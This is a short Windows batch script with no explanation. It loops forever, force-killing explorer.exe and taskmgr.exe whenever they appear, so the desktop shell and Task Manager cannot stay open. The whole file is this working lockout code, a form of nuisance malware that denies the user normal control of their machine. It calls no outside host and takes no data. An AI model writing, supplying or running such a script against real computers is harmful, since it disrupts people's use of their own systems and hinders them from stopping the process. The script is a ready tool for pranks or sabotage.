@echo off
:start
cls
tasklist /nh /fi "imagename eq explorer.exe" | find /i "explorer.exe" >nul && (
taskkill -im explorer.exe /f > nul
)
tasklist /nh /fi "imagename eq taskmgr.exe" | find /i "taskmgr.exe" >nul && (
taskkill -im taskmgr.exe /f > nul
)
goto :start